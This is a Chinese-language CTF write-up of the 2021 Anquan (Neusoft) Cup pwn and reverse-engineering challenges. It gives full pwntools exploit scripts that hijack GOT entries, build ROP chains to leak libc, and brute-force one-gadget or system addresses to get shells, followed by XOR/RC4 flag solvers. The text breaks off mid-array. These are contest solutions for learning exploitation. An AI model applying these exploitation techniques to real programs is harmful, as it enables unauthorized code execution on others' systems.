# 前言
这是第一届2021暗泉杯（东软杯）的pwn和re题解，这次比赛pwn看似不难，但是还是缺少思路，其中两道题目都是相似的逻辑，应该是一个出题人出的题目，当时没想到爆破，呜呜呜呜
# PWN -> NSS_shop
这个是签到题目，据官方说是个整数溢出，随便输点大数造成整数溢出就可以拿到flag
```
---------------
0.Flag: 10000$
1.Hint: 0$
---------------
> 0
Number of items >
123123123
flag{Pwn_Is_Vary_Ez}
```
# PWN -> justdoit （调整rbp）
## 题目分析
题目没开pie，没开canary，查看环境2.23，打开ida查看伪代码，很简单，但是没有溢出：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init();
  printf("Hi there! What is your name? ");
  read(0, buf, 24uLL);
  puts("That is an interesting chall");
  printf("where are you from? my frends??");
  read_long();
  return 0;
}

__int64 read_long()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  read(0, buf, 19uLL);
  return atol(buf);
}
```
程序很简单，有两次输入，都没溢出，仔细看看汇编代码发现可以随意修改rbp的位置：
```asm
.text:0000000000401239                 call    read_long
.text:000000000040123E                 add     rbp, rax        <-----rbp = rbp + rax>
.text:0000000000401241                 mov     eax, 0
.text:0000000000401246                 leave
.text:0000000000401247                 retn
```
所以这里就可以通过调整rbp控制程序的返回地址，但重要的是怎么利用？当时想着rop，但是这长度远远不够最小的rop长度（当时想的是至少4段，但是只有三段rop空间，少一个ret的空间，后来弄明白可以利用rbp调整来让程序返回到main，三段刚刚好够用），比赛也没做出来，后面才知道爆破是个可行方法.泄露libc也是一个方法。
## 利用思路

**利用方式1：爆破onegadget**

第一次输入可以输入3个地址长度，这里分别为read_long、第一个read地址、start地址，然后通过第二次read_long可以修改rbp到第一次输入buf的上方，程序下次返回就能返回到构造的地址read_long处，然后输入printf@got.plt的地址，atol后会设置rax为printf@got.plt，read_long返回会返回到第一个read地址处，接着read，但是注意此时的buf已被修改为printf@got.plt，因为read的第二个参数在rsi中，而在之前read_long函数执行完后rax被设置成printf@got.plt，当跳转到read的时候buf是由rax赋值的，所以在执行的时候就会往printf@got.plt处写，这就可以覆盖printf@got.plt的后3个字节为ongadget去拿shell。
```asm
.text:00000000004011FF                 mov     edx, 18h        ; nbytes
.text:0000000000401204                 mov     rsi, rax        ; buf
.text:0000000000401207                 mov     edi, 0          ; fd
.text:000000000040120C                 call    _read
.text:0000000000401211                 lea     rax, s          ; "That is an interesting chall"
```
这里经过调试发现当后面调用printf触发onegadget的时候rax=0，所以第一个onegadget可以用，这里我们只能确切修改地址末12bit位，经过比较onegadget和printf@got.plt相差3个字节24位，所以剩下的12位就只能爆破了。
利用步骤：

1. 输入返回地址read_long、第一个read地址
2. read_long调整rbp返回到read_long,接着输入printf@got.plt，rax=printf@got.plt
3. 返回到第一个read地址，此时read的buf = printf@got.plt，修改末12位为onegadget偏移，剩余12为爆破
4. 后面printf触发onegadget。

爆破长度12位，16*16*8=2048次，实际上爆破长度是16^3

**利用方式二：泄露libc，rop**

和上面方式一样，首先将输入三个main地址入栈（用于rop结束后返回到main），之后调整rbp返回到main函数，此时会在原栈帧上方（低地址）重新开辟栈空间，输入rop调用put函数将put地址泄露出来拿到libc，之后会再次返回到main，接着rop调用system('/bin/sh'),获取shell。
步骤：

1. 第一个read输入三个main地址用于返回，read_long调整rbp返回到main
2. 接着rop返回到put，泄露put地址，拿到libc
3. 接着rop返回到system，获取shell。

这种方式明显优于爆破方式，利用调整rbp来返回到rop，进而泄露libc，获取shell。
## exp1 爆破onegadget
```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
#io = process('./justdoit.1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


main=0x4011D5
pop_rdi=0x00000000004012b3
pop_rbp=0x000000000040114d
lea_ret=0x00000000004011d3


payload=p64(0x4011A9)+p64(0x4011FF)
#payload=p64(read_lpng)+p64(read)

def pwn():
    sn(payload)
    ru('where are you from? my frends??')
    sn(str(-0x28))
    sn(str(0x000000000404020))
    
    sn('\x26\x82\x3b')
    sleep(0.1)
    sl('ls')
    sl('ls')
    ru('flag')
    sl('cat flag')
    irt()



while True:
    try:
        #io=remote('47.106.172.144',65004)
        io=process('./justdoit.1')
        pwn()
 
    except:
        io.close()
        continue
```
## exp2 泄露libc，rop
```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('47.106.172.144', 65004)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
# io = process('./justdoit.1')
libc=ELF('./libc.so.6')
elf=ELF('./justdoit.1')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))

main=0x4011D5
pop_rdi=0x00000000004012b3
pop_rbp=0x000000000040114d
lea_ret=0x00000000004011d3

ru("name?")
sn(p64(main)+ p64(main) + p64(main))
ru("s??")
sl(b"-24")

ru("name?")
sn(p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]))
ru("s??")
sl(b"-40")
libc.address = l64() - libc.sym["puts"]
print(hex(libc.address))

ru("name?")
sn(p64(pop_rdi) + p64(libc.search('/bin/sh').next()) + p64(libc.sym['system']))
ru("s??")
# dbg()
sl(b"-40")

irt()

```
## 总结
这个题目只涉及了栈，没有溢出，只有人为构造的漏洞可以调整rbp，这考察了选手思维活跃性，想出不同的利用方法，当时做的时候没有想到如何去修改printf@got.plt，这里的方法很妙，巧妙的运用了调整rbp，将buf修改为printf@got.plt实现写入，之后爆破就不需要泄露地址了，要时刻注意汇编的细节。利用方式2首选，可以直接拿到shell，当时不知如何泄露libc，想来是没有彻底明白栈帧的嵌套顺序，及调用函数返回时栈帧的变化，导致没有看出来可以输入三个main来进行连续返回。
## 出题思路

1. 没有栈溢出，只开NX，通过`add rbp，rax`调整rbp的位置
2. 结合程序read实现修改printf@got.plt为onegadget
3. 结合程序read和调整rbp的位置，使得程序可以多次利用，put泄露libc，巧妙构造rop

# PWN -> reallNeedGoodLuck （栈任意地址写4字节）
## 题目分析
这个题目出题风格类似上一题，安全保护、环境一样，也是简单的栈利用，原理相同，ida查看伪代码：
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _DWORD *v3; // [rsp+0h] [rbp-30h]
  int buf; // [rsp+Ch] [rbp-24h] BYREF
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init();                        <-----里面有setvbuf------>
  puts("need");
  puts("good");
  read(0, &buf, 4uLL);          <-------输入4字节--------->
  puts("luck! ");
  read(0, nptr, 9uLL);          <-------输入9字节--------->
  v3 = (_DWORD *)atoi(nptr);
  *v3 = buf;                    <-------将buf写到ptr处----->
  exit(0);
}
```
存在任意地址写4字节漏洞，和上一个题一样将setvbuf@got.plt后12位改为onegadget偏移，之后爆破12位，爆破长度仍然是16^3
## 利用方式

**利用方式1：爆破onegadget**

这个题和上个题目不同的是主函数没有return，有exit函数，那么怎么让他返回呢？这里还是通过漏洞将exit改成main函数地址，实现多次利用，然后再将setvbuf后三字节改成onegadget固定偏移，爆破3字节长度，获取shell。
步骤：
1. 修改exit为mian函数，使其可以返回
2. 修改setvbuf末12位为onegadget偏移
3. 爆破，调用setvbuf触发onegadget。

**利用方式2：爆破system**

题目提供了任意地址写4字节，利用方式和上面差不多，知识换用了爆破system，因为爆破system只用爆破1字节长度，也就是16^2,成功率很高。
步骤：

1. 修改exit为mian函数，使其可以返回
2. 修改atoi末12位为system偏移
3. 爆破，调用atoi，参数binsh来触发shell。

方式2比方式以成功率高了一个量级，基本手爆就出来了。
## exp1 blast onegadget
```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
#io = process('./reallNeedGoodLuck.1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
elf=ELF('./reallNeedGoodLuck.1')

#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


exit_got=elf.got['exit']
read_got=elf.got['read']
setvbuf_got=elf.got['setvbuf']
def pwn():
    #io=remote('47.106.172.144',65003)
    ru('good')
    sn(p32(0x4011A9)) # main addr

    ru('luck! ')
    sn(str(exit_got))
 
    ru('good')
    sleep(0.1)
    sn('\x00\x7a\xe2\x3d') # onegadget

    ru('luck! ')
    
    sn(str(setvbuf_got-1))
    sleep(0.1)
    sl('ls')
    sl('ls')
    ru('flag')
    sl('cat flag')


    irt()
while True:
    try:
        #io=remote('47.106.172.144',65003)
        io=process('./reallNeedGoodLuck.1')
        #debug()
        pwn()

    except:
        io.close()
        continue
```
## exp2 blast system
```python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
#io = process('./reallNeedGoodLuck.1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
elf=ELF('./reallNeedGoodLuck.1')

#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


exit_got=elf.got['exit']
read_got=elf.got['read']
atoi_got=elf.got['atoi']
print hex(atoi_got)
def pwn():
    #io=remote('47.106.172.144',65003)
    ru('good')
    sn(p32(0x4011A9)) # main addr
    ru('luck! ')
    sn(str(exit_got))
    dbg()
    ru('good')
    sleep(0.1)
    sn('\x00\x00\xa0\xf3') # system
    ru('luck! ')
    sn(str(atoi_got-2)) # atoi

    ru('good')
    sn(p32(0)) # 
    sl(b'/bin/sh\x00')

    sl('ls')
    sl('ls')
    ru('flag')
    sl('cat flag')


    irt()
while True:
    try:
        # io=remote('47.106.172.144',65003)
        io=process('./reallNeedGoodLuck.1')
        #dbg()
        pwn()

    except:
        io.close()
        continue


```
## 总结
这道题和上道题利用方式其实差不多，只是这道题展现形式不一样，更直接的给出了任意地址写4字节，里用同样的方法进行爆破即可成功拿到shell。
## 出题思路

1. 利用任意地址写来修改setvbuf的偏移，使其末12位指向onegadget偏移，进行爆破。
2. 利用任意地址写来修改atoi的偏移，使其末12位指向system偏移，进行爆破。

# PWN -> iterator （数组无边界检查越界）
## 题目分析
题目没有开pie，环境仍然是2.23，运行程序:
```bash
----------
1. New phone list
2. show list item
3. edit list item
4. overwrite list
5. show all list
6. exit
----------
> 
```
ida分析，发现主要漏洞点在overwrite函数里，没有对数组边界进行检查：
```c
int overwrite()
{
  int v1; // [rsp+8h] [rbp-48h]
  int start; // [rsp+Ch] [rbp-44h]
  int end; // [rsp+10h] [rbp-40h]
  int v4; // [rsp+14h] [rbp-3Ch]
  __int64 v5; // [rsp+18h] [rbp-38h] BYREF
  __int64 v6; // [rsp+20h] [rbp-30h] BYREF
  __int64 v7; // [rsp+28h] [rbp-28h] BYREF
  __int64 v8; // [rsp+30h] [rbp-20h] BYREF
  _QWORD *list_ptr; // [rsp+38h] [rbp-18h]

  printf("List id: ");
  v1 = input();
  if ( v1 < 0 || v1 > 10 )
    return puts("id out of range");
  list_ptr = (_QWORD *)qword_4050E0[v1];
  if ( !list_ptr )
    return puts("List undefined");
  printf("Star id: ");         <--------startid-------->
  start = input();
  printf("End id: ");
  end = input();               <----------endid-------->
  printf("New number: ");
  v4 = input();
  v8 = sub_401972(list_ptr);
  v5 = sub_401998(&v8, start);
  v7 = sub_401972(list_ptr);
  v8 = sub_401998(&v7, end);
  v6 = sub_401998(&v8, 1LL);
  v8 = sub_4019D8(list_ptr);
  if ( sub_401A01((__int64)&v6, (__int64)&v8) )
  {
    while ( sub_401A01((__int64)&v5, (__int64)&v6) )
    {
      *(_QWORD *)sub_401A3E((__int64)&v5) = v4;
      sub_401A50(&v5);
    }
  }
  return puts("Overwrite Done");
}
```
overwrite函数没有对数组边界检查，导致可以覆盖其他list的内容，导致可以往heap上写地址然后泄露libc。

题目功能如下：

1. new申请一个自定义大小的iterator结构，会生成两个chunk，第一个chunk是结构体，指向第二个chunk，存的是iterator的元素具体内容，list指针在bss段
2. edit编辑iterator的特定idx元素。
3. overwrite批量修改iterator结构的start到end的元素。在这里没有限制边界导致覆盖其他结构体指针。
4. show输出结构体某个元素

```pwndbg> x/30gx 0x0000000001ac9c20
0x1ac9c10:      0x0000000000000000      0x0000000000000021       <-----iterator 0>
0x1ac9c20:      0x0000000001ac9c40      0x0000000001ac9c48
0x1ac9c30:      0x0000000001ac9c48      0x0000000000000021
0x1ac9c40:      0x0000000000000000      0x0000000000000000
0x1ac9c50:      0x0000000000000000      0x0000000000000021       <-----iterator 1>
0x1ac9c60:      0x0000000000405070<---atoi@got.plt      0x0000000001ac9ca0
0x1ac9c70:      0x0000000001ac9ca0      0x0000000000000031
0x1ac9c80:      0x0000000000000000      0x0000000000000000
0x1ac9c90:      0x0000000000000000      0x0000000000000000
0x1ac9ca0:      0x0000000000000000      0x0000000000020361
```

## 利用思路
可以利用第0个iterator覆盖第1个iterator结构体指向其内容的指针为atoi@got.plt，从而利用show泄露libc地址，然后对1个结构进行edit修改atoi为system，从而获取shell。

步骤：

1. 新建两个iterator
2. 对第0个iterator进行overwrite批量修改为atoi，由于没有检查边界，可以将第1个iterator的指针覆盖成atoi@got.plt
3. show第1个iterator，泄露atoi地址得到libc
4. edit第1个iterator，修改atoi为system
5. 触发atoi('/bin/sh'),获取shell。

## exp
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
io = process('./main')
# p = remote('47.106.172.144',65001)


l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))

def New(count):
    sla("> ",str(1))
    sla(": ",str(count))
def Show(count,item):
    sla("> ",str(2))
    sla("id: ",str(count))
    sla("id: ",str(item))
def Edit(count,item,num):
    sla("> ",str(3))
    sla("List id: ",str(count))
    sla("Item id: ",str(item))
    sla("number: ",str(num))
def Over_write(count,end,num,flags = 1):
    sla("> ",str(4))
    sla("id: ",str(count))
    if flags:
        sla("id: ",str(end))
        sla("id: ",str(end))
    sla("number: ",str(num))
def show_all():
    sla("> ",str(5))
New(0x1)#0
New(0x4)#1

Over_write(0,4,0x405070) # atoi
# dbg()
Show(1,0)
libc = ELF("./libc.so.6")
ru("Number: ")
atoi = int(ru("\n",True),10)
print(hex(libc.symbols['system']))
system = atoi - libc.symbols["atoi"]+libc.symbols["system"]

Edit(1,0,system)

sla("> ",'sh\x00')

irt()
```
## 总结
在处理迭代器时，没有合理的判断迭代器范围，导致了指针越界。合理布局内存可以覆写 Vector 的结构体，执行任意内存读写，最终劫持 Got 表。比赛时没有深入看这道题，还要加强对Vector的结构体理解。总之发现此次比赛题目考点有相似的地方，且都不是很难，主要是自己对其利用方式还是不熟，不能发散的去结合程序思考利用方式，还是得多练习。
## 出题思路

1. 数组越界，vector结构体，no pie

# Re ->singin
ida打开直接得到flag。
# Re -> HappyCTF
## 题目分析
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // eax
  void *v4; // eax
  int result; // eax
  void *v6; // eax
  void *v7; // eax
  int v8; // [esp+5Ch] [ebp-70h]
  char *v9; // [esp+60h] [ebp-6Ch]
  char v10[27]; // [esp+6Ch] [ebp-60h] BYREF
  char v11; // [esp+87h] [ebp-45h]
  char *v12; // [esp+88h] [ebp-44h]
  char *v13; // [esp+8Ch] [ebp-40h]
  char *v14; // [esp+90h] [ebp-3Ch]
  _DWORD v15[3]; // [esp+98h] [ebp-34h] BYREF
  char v16[24]; // [esp+A4h] [ebp-28h] BYREF
  int v17; // [esp+C8h] [ebp-4h]

  sub_402930(v16);
  v17 = 0;
  v3 = (void *)output((int)&unk_4DDAF8, "please input flag");
  sub_4039B0(v3, (int (__cdecl *)(void *))sub_402310);
  sub_401500(&dword_4DDA80, v16);
  if ( sub_405DE0(v16) == 24 )
  {
    sub_402A20(v15);
    LOBYTE(v17) = 1;
    sub_402570(v15);
    v14 = v16;
    v13 = (char *)sub_405270(v16);
    v12 = (char *)sub_4052B0(v16);
    while ( v13 != v12 )
    {
      v11 = *v13;
      sub_403B70(v11);                               <--------point----->
      ++v13;
    }
    qmemcpy(v10, "rxusoCqxw{yqK`{KZqag{r`i", 24);    <---------cmp---->
    ((void (__stdcall *)(char *))sub_402590)(v10);
    v9 = (char *)sub_405290(v15);
    v8 = sub_4052E0(v15);
    while ( v9 != (char *)v8 )
    {
      if ( !(unsigned __int8)sub_403BB0(*v9) )
      {
        v6 = (void *)output((int)&unk_4DDAF8, "error");
        sub_4039B0(v6, (int (__cdecl *)(void *))sub_402310);
        LOBYTE(v17) = 0;
        sub_4034E0(v15);
        v17 = -1;
        sub_403450(v16);
        return 0;
      }
      ++v9;
    }
    v7 = (void *)output((int)&unk_4DDAF8, "good job");
    sub_4039B0(v7, (int (__cdecl *)(void *))sub_402310);
    LOBYTE(v17) = 0;
    sub_4034E0(v15);
    v17 = -1;
    sub_403450(v16);
    result = 0;
  }
  else
  {
    v4 = (void *)output((int)&unk_4DDAF8, "not enought");
    sub_4039B0(v4, (int (__cdecl *)(void *))sub_402310);
    v17 = -1;
    sub_403450(v16);
    result = 0;
  }
  return result;
}

int __thiscall sub_403B70(void *this, char a2)
{
  char v3[65]; // [esp+Fh] [ebp-45h] BYREF
  void *v4; // [esp+50h] [ebp-4h]

  v4 = this;
  v3[0] = a2 ^ 0x14;                 <-------point-------->
  sub_406170(v3);
  return ++dword_4DD8F8;
}
```
经过分析你会发现就仅仅做了亦或操作。
## exp
```python
s ='rxusoCqxw{yqK`{KZqag{r`i'
for i in range(len(s)):
	print (chr(ord(s[i])^0x14),end = '')
# flag{Welcome_to_Neusoft}% 
```
# Re -> Remember Crypt 4
## 题目分析
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int inputlen; // eax
  void *v5; // rax
  void *v7; // rax
  int i; // [rsp+24h] [rbp-D4h]
  _DWORD *v9; // [rsp+28h] [rbp-D0h]
  char input[32]; // [rsp+30h] [rbp-C8h] BYREF
  char Str[32]; // [rsp+50h] [rbp-A8h] BYREF
  char v12[96]; // [rsp+70h] [rbp-88h] BYREF

  strcpy(Str, "12345678abcdefghijklmnopqrspxyz");
  memset(v12, 0, sizeof(v12));
  memset(input, 0, 0x17ui64);
  sub_1400054D0("%s", input);
  v9 = malloc(0x408ui64);
  v3 = strlen(Str);
  init_rc4(v9, Str, v3);
  inputlen = strlen(input);
  rc4(v9, input, inputlen);                                         <-------rc4----->
  for ( i = 0; i < 22; ++i )
  {
    if ( ((unsigned __int8)input[i] ^ 0x22) != (unsigned __int8)byte_14013B000[i] ) <-------亦或0x22----->
    {
      v5 = (void *)sub_1400015A0(&off_14013B020, "error");
      _CallMemberFunction0(v5, sub_140001F10);
      return 0;
    }
  }
  v7 = (void *)sub_1400015A0(&off_14013B020, "nice job");
  _CallMemberFunction0(v7, sub_140001F10);
  return 0;
}
```
看明白还是简单的亦或操作，不必看具体怎么初始化，就只看rc4里面的亦或，可逆操作，rc4里面算法大部分都是定值，可以复现函数逻辑进行解密，也可以直接调试得到定值，直接亦或得到flag。我当时是复现了函数逻辑emo
## exp
```python
byte = [
  0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x01, 0xA6, 0x53, 0x59, 0x1B, 
  0x0A, 0x20, 0xF1, 0x73, 0xD1, 0x0E, 0xAB, 0x09, 0x84, 0x0E, 
  0x8D, 0x2B
]

# get for memory
a1 = [
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0x64,0x00,0x00,0x00,0x99,0x00,0x00,0x00,0xD0,0x00,0x00,0x00,0x09,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x81,0x00,0x00,0x00,0xD2,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x2C,0x00,0x00,0x00,0xFC,0x00,0x00,0x00,0xDE,0x00,0x00,0x00,0xDC,0x00,0x00,0x00,0x89,0x00,0x00,0x00,0x4C,0x00,0x00,0x00,0x3B,0x00,0x00,0x00,0xB4,0x00,0x00,0x00,0xF5,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x2B,0x00,0x00,0x00,0x70,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x0F,0x00,0x00,0x00,0x0E,0x00,0x00,0x00,0x3E,0x00,0x00,0x00,0x0C,0x00,0x00,0x00,0x67,0x00,0x00,0x00,0x6D,0x00,0x00,0x00,0x91,0x00,0x00,0x00,0xB2,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xDF,0x00,0x00,0x00,0x75,0x00,0x00,0x00,0xF9,0x00,0x00,0x00,0x27,0x00,0x00,0x00,0x96,0x00,0x00,0x00,0xE1,0x00,0x00,0x00,0x15,0x00,0x00,0x00,0xF0,0x00,0x00,0x00,0x45,0x00,0x00,0x00,0xC2,0x00,0x00,0x00,0x2D,0x00,0x00,0x00,0x97,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x55,0x00,0x00,0x00,0xB1,0x00,0x00,0x00,0x69,0x00,0x00,0x00,0x87,0x00,0x00,0x00,0x61,0x00,0x00,0x00,0xEF,0x00,0x00,0x00,0x50,0x00,0x00,0x00,0xA6,0x00,0x00,0x00,0x43,0x00,0x00,0x00,0x25,0x00,0x00,0x00,0x93,0x00,0x00,0x00,0xE0,0x00,0x00,0x00,0x47,0x00,0x00,0x00,0xAC,0x00,0x00,0x00,0x98,0x00,0x00,0x00,0x19,0x00,0x00,0x00,0xED,0x00,0x00,0x00,0x4D,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4A,0x00,0x00,0x00,0xBD,0x00,0x00,0x00,0xDB,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x86,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0xE5,0x00,0x00,0x00,0x92,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x24,0x00,0x00,0x00,0xD3,0x00,0x00,0x00,0xF3,0x00,0x00,0x00,0xF6,0x00,0x00,0x00,0xC3,0x00,0x00,0x00,0xFA,0x00,0x00,0x00,0x3F,0x00,0x00,0x00,0xB0,0x00,0x00,0x00,0x1E,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x9E,0x00,0x00,0x00,0x1B,0x00,0x00,0x00,0x54,0x00,0x00,0x00,0x1C,0x00,0x00,0x00,0xFD,0x00,0x00,0x00,0xA1,0x00,0x00,0x00,0x13,0x00,0x00,0x00,0x85,0x00,0x00,0x00,0x76,0x00,0x00,0x00,0x29,0x00,0x00,0x00,0xD6,0x00,0x00,0x00,0xC9,0x00,0x00,0x00,0xCA,0x00,0x00,0x00,0x6E,0x00,0x00,0x00,0x2A,0x00,0x00,0x00,0xE3,0x00,0x00,0x00,0x7B,0x00,0x00,0x00,0x5D,0x00,0x00,0x00,0x8E,0x00,0x00,0x00,0x9F,0x00,0x00,0x00,0x6F,0x00,0x00,0x00,0x26,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x8B,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x8D,0x00,0x00,0x00,0x12,0x00,0x00,0x00,0xAA,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x71,0x00,0x00,0x00,0x4F,0x00,0x00,0x00,0xEE,0x00,0x00,0x00,0x84,0x00,0x00,0x00,0xAF,0x00,0x00,0x00,0x52,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0xCF,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x33,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x5E,0x00,0x00,0x00,0x31,0x00,0x00,0x00,0x6C,0x00,0x00,0x00,0xD7,0x00,0x00,0x00,0xA5,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0xF1,0x00,0x00,0x00,0x44,0x00,0x00,0x00,0x34,0x00,0x00,0x00,0xB6,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x74,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xA7,0x00,0x00,0x00,0x5F,0x00,0x00,0x00,0x9D,0x00,0x00,0x00,0xDA,0x00,0x00,0x00,0xFE,0x00,0x00,0x00,0xD5,0x00,0x00,0x00,0xDD,0x00,0x00,0x00,0x35,0x00,0x00,0x00,0x65,0x00,0x00,0x00,0x7E,0x00,0x00,0x00,0xBA,0x00,0x00,0x00,0xE9,0x00,0x00,0x00,0xA2,0x00,0x00,0x00,0xC7,0x00,0x00,0x00,0xCE,0x00,0x00,0x00,0xE2,0x00,0x00,0x00,0xA3,0x00,0x00,0x00,0x9B,0x00,0x00,0x00,0x22,0x00,0x00,0x00,0xFF,0x00,0x00,0x00,0xC8,0x00,0x00,0x00,0x77,0x00,0x00,0x00,0xA4,0x00,0x00,0x00,0x8F,0x00,0x00,0x00,0xCC,0x00,0x00,0x00,0xE7,0x00,0x00,0x00,0x0B,0x00,0x00,0x00,0xE6,0x00,0x00,0x00,0xBF,0x00,0x00,0x00,0x5A,0x00,0x00,0x00,0x39,0x00,0x00,0x00,0xB9,0x00,0x00,0x00,0x63,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xE4,0x00,0x00,0x00,0xBE,0x00,0x00,0x00,0xB8,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x0A,0x00,0x00,0x00,0x88,0x00,0x00,0x00,0x49,0x00,0x00,0x00,0x5B,0x00,0x00,0x00,0x7A,0x00,0x00,0x00,0x5C,0x00,0x00,0x00,0xA8,0x00,0x00,0x00,0